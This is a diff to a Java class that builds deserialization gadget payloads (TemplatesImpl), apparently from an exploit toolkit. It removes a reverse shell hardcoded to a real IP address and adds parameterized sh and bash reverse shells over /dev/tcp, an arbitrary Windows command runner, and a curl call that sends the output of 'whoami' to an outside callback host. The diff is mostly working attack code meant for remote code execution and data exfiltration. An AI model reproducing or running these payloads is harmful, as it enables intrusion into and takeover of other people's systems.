@@ -58,8 +58,9 @@ public class GadgetUtils {
     }
 
     //whoami
-    public static TemplatesImpl getTemplatesImplReverseShell() throws NotFoundException, CannotCompileException, IOException, NoSuchFieldException, InstantiationException, IllegalAccessException {
-        String cmd = "new String[]{\"/bin/sh\",\"-c\",\"sh -i >& /dev/tcp/159.226.94.139/19001 0>&1\"}";
+    public static TemplatesImpl getTemplatesImplReverseShell(String ip,String port) throws NotFoundException, CannotCompileException, IOException, NoSuchFieldException, InstantiationException, IllegalAccessException {
+
+        String cmd = "new String[]{\"/bin/sh\",\"-c\",\"sh -i >& /dev/tcp/"+ip+"/"+port+" 0>&1\"}";
         return createTemplatesImpl(cmd);
     }
     //定制命令
@@ -67,12 +68,22 @@ public class GadgetUtils {
         String cm = "new String[]{\"/bin/bash\",\"-c\",\""+cmd+"\"}";
         return createTemplatesImpl(cm);
     }
-
-    public static TemplatesImpl templatesImplLocalWindows() throws NotFoundException, CannotCompileException, IOException, NoSuchFieldException, InstantiationException, IllegalAccessException {
-        String cm = "\"calc\"";
-        return createTemplatesImpl(cm);
+    public static TemplatesImpl getTemplatesImplReverseBashShell(String ip,String port) throws NotFoundException, CannotCompileException, IOException, NoSuchFieldException, InstantiationException, IllegalAccessException {
+        String command = "bash -i >& /dev/tcp/"+ip+"/"+port+" 0>&1";
+        String cmd = "new String[]{\"/bin/bash\",\"-c\",\""+command+"\"}";
+        System.out.println(cmd);
+        return createTemplatesImpl(cmd);
     }
 
+    public static TemplatesImpl templatesImplLocalWindows(String command) throws NotFoundException, CannotCompileException, IOException, NoSuchFieldException, InstantiationException, IllegalAccessException {
+//        String cm = "\"calc\"";
+        String cm = "\""+command+"\"";
+        return createTemplatesImpl(cm);
+    }
+    public static TemplatesImpl curlCommandResult() throws NotFoundException, CannotCompileException, IOException, NoSuchFieldException, InstantiationException, IllegalAccessException {
+        String cmd = "\"curl `whoami`.gufd.callback.red\"";
+        return createTemplatesImpl(cmd);
+    }
 
 
     //延时检测，不执行命令
